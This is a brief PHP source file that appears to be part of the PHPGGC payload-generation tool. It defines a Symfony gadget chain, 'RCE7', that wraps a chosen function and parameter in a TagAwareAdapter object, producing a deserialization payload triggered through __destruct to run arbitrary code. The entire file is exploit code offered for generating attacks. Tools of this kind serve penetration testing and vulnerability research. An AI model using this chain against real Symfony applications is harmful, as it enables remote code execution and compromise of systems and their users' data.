<?php

namespace GadgetChain\Symfony;

class RCE7 extends \PHPGGC\GadgetChain\RCE\FunctionCall
{
    public static $version = '-3.4+';
    public static $vector = '__destruct';
    public static $author = 'CyanM0un';

    public function generate(array $parameters)
    {
        $function = $parameters['function'];
        $parameter = $parameters['parameter'];

        return new \Symfony\Component\Cache\Adapter\TagAwareAdapter($function,$parameter); 
    }
}